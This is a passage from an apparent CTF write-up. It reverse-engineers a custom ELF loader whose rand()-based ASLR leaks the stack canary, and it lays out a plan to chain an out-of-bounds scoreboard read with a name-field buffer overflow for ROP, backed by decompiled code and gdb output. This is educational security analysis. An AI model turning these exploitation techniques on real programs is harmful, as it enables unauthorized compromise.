</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xe</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xe</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x12</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x2c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">die</span><span class="p">(</span><span class="s">&#34;duplicate symtabs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_22</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x3e</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">die</span><span class="p">(</span><span class="s">&#34;duplicate strtabs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">die</span><span class="p">(</span><span class="s">&#34;unknown section type&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">die</span><span class="p">(</span><span class="s">&#34;SHF_MASKPROC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">uVar1</span> <span class="o">=</span> <span class="n">local_22</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">local_22</span> <span class="o">+</span> <span class="mh">0x2c</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">           <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xfffU</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">local_22</span> <span class="o">+</span> <span class="mh">0x2c</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">uVar3</span> <span class="o">=</span> <span class="n">mmap_or_die</span><span class="p">(</span><span class="n">local_20</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                      <span class="p">(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">local_22</span> <span class="o">+</span> <span class="mh">0x2c</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">local_22</span> <span class="o">+</span> <span class="mh">0x2c</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">local_38</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">**</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="n">local_22</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">local_30</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">          <span class="k">for</span> <span class="p">(</span><span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_40</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span> <span class="n">local_40</span> <span class="o">=</span> <span class="n">local_40</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="n">local_38</span> <span class="o">=</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_38</span> <span class="o">=</span> <span class="n">local_38</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_30</span> <span class="o">=</span> <span class="n">local_30</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00401af9</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_22</span> <span class="o">=</span> <span class="n">local_22</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Quite long, but basically, it is used to load each object file those were given in the challenge. There are 7 files, so the method <code>load_o_phase_1</code> will be called 7 times. We just need to go to the important LOC in the <code>load_o_phase_1</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uVar3</span> <span class="o">=</span> <span class="n">aslr_get_addr</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>On each load, the method will call <code>aslr_get_addr</code>. Let&rsquo;s check this method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ulong</span> <span class="nf">aslr_get_addr</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">extraout_var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">CONCAT44</span><span class="p">(</span><span class="n">extraout_var</span><span class="p">,</span><span class="n">iVar1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x1c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar3</span> <span class="o">=</span> <span class="n">sys_mmap</span><span class="p">(</span><span class="n">uVar2</span><span class="p">,</span><span class="n">param_1</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x100022</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">uVar3</span> <span class="o">&lt;</span> <span class="mh">0xfffffffffffff000</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;note: candidate address occupied&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">uVar3</span> <span class="o">!=</span> <span class="n">uVar2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">die</span><span class="p">(</span><span class="s">&#34;No idea. Should not happen.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">sys_munmap</span><span class="p">(</span><span class="n">uVar3</span><span class="p">,</span><span class="n">param_1</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Checking through the assembly, the <code>edi</code> is set to 0xc before calling the <code>rand()</code> method.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/OFroRDt.png"
        data-srcset="https://i.imgur.com/OFroRDt.png, https://i.imgur.com/OFroRDt.png 1.5x, https://i.imgur.com/OFroRDt.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/OFroRDt.png"
        title="https://i.imgur.com/OFroRDt.png" /></p>
<p>Now we have found the custom aslr method! Turn out, the way it does the ASLR is, it will call <code>rand()</code> method to get 12-bits (0xc) of a random number, and use this value as the first 12-bit base address of the loaded object file. After getting this base address, later on, the object file method will be mapped to the generated address.</p>
<p>And checking through Ghidra, after initializing the canary stack value, <code>rand()</code> will be only called during assigning the aslr of the loaded object via this method. You can see in below picture that <code>rand()</code> is only used in <code>init_stack_guard</code> (0x402163) and <code>aslr_get_addr</code> (0x40160c) method.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/jWXxfiQ.png"
        data-srcset="https://i.imgur.com/jWXxfiQ.png, https://i.imgur.com/jWXxfiQ.png 1.5x, https://i.imgur.com/jWXxfiQ.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/jWXxfiQ.png"
        title="https://i.imgur.com/jWXxfiQ.png" /></p>
<p>Remember from the previous analysis, that if we somehow manage to get the n <code>rand()</code> call values after the call of <code>init_stack_guard</code>, we might be able to recover the <code>rand_state</code> after the <code>init_stack_guard</code> call, which is equivalent to the <code>canary</code> value set in our binary. And turn out, each of the n <code>rand()</code> call values is used as the aslr base address of each loaded file.</p>
<p>So, if we&rsquo;re somehow able to retrieve these aslr addresses (which is constructed from the <code>rand()</code> value result), it will be great for us, because that means we will be able to recover consecutive <code>rand()</code> results, where the <code>rand()</code> call is based on a <code>rand_state</code> that is equivalent to the <code>canary</code> value. And using these recovered values, we will try to reconstruct the initial <code>rand_state</code> (which is our <code>canary</code>).</p>
<p>To summarize, <code>loader</code> will load 7 object files (because we were given 7 object files in the challenge), which means there will be 7 consecutive calls to <code>rand()</code> after the <code>rand_state</code> is equivalent to <code>canary</code> value. And our target is to leak these 7 aslr addresses.</p>
<h5 id="run-the-main-program">Run the main program</h5>
<p>Well yeah, after the <code>loader</code> finished all of its object files, it will run the <code>main</code> program, which run the methods defined in the <code>game.o</code> file.</p>
<h3 id="exploitation-plan">Exploitation Plan</h3>
<p>Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far:</p>
<ul>
<li>We can leak the <code>canary</code> value if we&rsquo;re able to retrieve the <code>rand()</code> results of the <code>aslr_get_addr</code> value, which is the aslr base address of each loaded object file region.</li>
<li>There is BOF in the <code>get_player_name</code> method.
<ul>
<li>This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need <code>canary</code> value.</li>
</ul>
</li>
<li>There is OOB in the <code>see_scoreboard</code> method.
<ul>
<li>We need to be able to leak some useful values</li>
<li>Hopefully, with this OOB, we can leak the <code>rand()</code> results.</li>
</ul>
</li>
</ul>
<h4 id="recover-rand-value">Recover rand() value</h4>
<p>Our first step will be recovering the <code>rand()</code> values which are used as the aslr of each loaded object region.</p>
<p>So, let&rsquo;s try to set up our gdb and then explore how the values are initialized. This is my breakpoint setup</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b *init_stack_guard+85
</span></span><span class="line"><span class="cl">b *aslr_get_addr+37
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first breakpoint will be used to get the <code>canary</code> value just for sanity checking. The second breakpoint will be used to retrieve the <code>rand()</code> result of the <code>aslr</code> method.</p>
<p>Let&rsquo;s try stepping on the gdb.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$rax   : 0x75924ac4cc2d256a
</span></span><span class="line"><span class="cl">$rbx   : 0x0               
</span></span><span class="line"><span class="cl">$rcx   : 0x3a              
</span></span><span class="line"><span class="cl">$rdx   : 0x75924ac4cc2d256a
</span></span><span class="line"><span class="cl">$rsp   : 0x007fffffffdcb8  →  0x0000000000000008
</span></span><span class="line"><span class="cl">$rbp   : 0x007fffffffdcc8  →  0x007fffffffdcf8  →  0x0000000000000000
</span></span><span class="line"><span class="cl">$rsi   : 0x007ffff7ff8000  →  0x0000000000000000
</span></span><span class="line"><span class="cl">$rdi   : 0x3a              
</span></span><span class="line"><span class="cl">$rip   : 0x00000000402168  →  &lt;init_stack_guard+85&gt; mov rdi, rax
</span></span><span class="line"><span class="cl">$r8    : 0x0               
</span></span><span class="line"><span class="cl">$r9    : 0x0               
</span></span><span class="line"><span class="cl">$r10   : 0x22              
</span></span><span class="line"><span class="cl">$r11   : 0x206             
</span></span><span class="line"><span class="cl">$r12   : 0x0               
</span></span><span class="line"><span class="cl">$r13   : 0x0               
</span></span><span class="line"><span class="cl">$r14   : 0x0               
</span></span><span class="line"><span class="cl">$r15   : 0x0               
</span></span><span class="line"><span class="cl">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
</span></span><span class="line"><span class="cl">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
</span></span><span class="line"><span class="cl">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span class="line"><span class="cl">0x007fffffffdcb8│+0x0000: 0x0000000000000008	 ← $rsp
</span></span><span class="line"><span class="cl">0x007fffffffdcc0│+0x0008: 0x007ffff7ff8000  →  0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdcc8│+0x0010: 0x007fffffffdcf8  →  0x0000000000000000	 ← $rbp
</span></span><span class="line"><span class="cl">0x007fffffffdcd0│+0x0018: 0x000000004023e8  →  &lt;_start+42&gt; mov DWORD PTR [rbp-0x4], 0x0
</span></span><span class="line"><span class="cl">0x007fffffffdcd8│+0x0020: 0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdce0│+0x0028: 0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdce8│+0x0030: 0x0000000000000000
</span></span><span class="line"><span class="cl">0x007fffffffdcf0│+0x0038: 0x0000000000000000
</span></span><span class="line"><span class="cl">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
</span></span><span class="line"><span class="cl">     0x402159 &lt;init_stack_guard+70&gt; call   0x40100d &lt;syscall2&gt;
</span></span><span class="line"><span class="cl">     0x40215e &lt;init_stack_guard+75&gt; mov    edi, 0x40
</span></span><span class="line"><span class="cl">     0x402163 &lt;init_stack_guard+80&gt; call   0x40146c &lt;rand&gt;
</span></span><span class="line"><span class="cl"> →   0x402168 &lt;init_stack_guard+85&gt; mov    rdi, rax
</span></span><span class="line"><span class="cl">     0x40216b &lt;init_stack_guard+88&gt; call   0x401064 &lt;write_stack_guard&gt;
</span></span><span class="line"><span class="cl">     0x402170 &lt;init_stack_guard+93&gt; nop    
</span></span><span class="line"><span class="cl">     0x402171 &lt;init_stack_guard+94&gt; leave  
</span></span><span class="line"><span class="cl">     0x402172 &lt;init_stack_guard+95&gt; ret    
</span></span><span class="line"><span class="cl">     0x402173 &lt;pivot_to_main+0&gt; endbr64 
</span></span><span class="line"><span class="cl">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span></span><span class="line"><span class="cl">[#0] Id 1, Name: &#34;loader&#34;, stopped 0x402168 in init_stack_guard (), reason: BREAKPOINT
</span></span><span class="line"><span class="cl">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span class="line"><span class="cl">[#0] 0x402168 → init_stack_guard()
</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class="line"><span class="cl">gef➤  
</span></span></code></pre></td></tr></table>
</div>
</div><p>We hit our first breakpoint, and <code>rax</code> is the <code>canary</code> value.</p>
<p>Let&rsquo;s continue and take notes on the <code>rax</code> value on each breakpoint because it is the <code>rand()</code> result. I won&rsquo;t display the result here because it&rsquo;s too long.</p>
<p>After stepping 7 times, these are the <code>rand()</code> consecutive results (which are retrieved from <code>rax</code> values on each break).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x42f, 0xf90, 0x97e, 0x7ab, 0xc92, 0x6fe, 0xf0b
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check the vmmap to confirm that this 12-bits number is indeed used as the base address of each loaded object.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  vmmap
</span></span><span class="line"><span class="cl">[ Legend:  Code | Heap | Stack ]
</span></span><span class="line"><span class="cl">Start              End                Offset             Perm Path
</span></span><span class="line"><span class="cl">0x000042f0000000 0x000042f0002000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x000042f0002000 0x000042f0004000 0x00000000000000 rw- 
</span></span><span class="line"><span class="cl">0x000042f0004000 0x000042f0005000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x00006fe0000000 0x00006fe0001000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x00006fe0001000 0x00006fe0003000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x00007ab0000000 0x00007ab0002000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x00007ab0002000 0x00007ab0004000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x000097e0000000 0x000097e0002000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x000097e0002000 0x000097e0004000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x0000c920000000 0x0000c920002000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x0000c920002000 0x0000c920003000 0x00000000000000 rw- 
</span></span><span class="line"><span class="cl">0x0000c920003000 0x0000c920005000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x0000f0b0000000 0x0000f0b0002000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x0000f0b0002000 0x0000f0b0003000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x0000f900000000 0x0000f900002000 0x00000000000000 r-x 
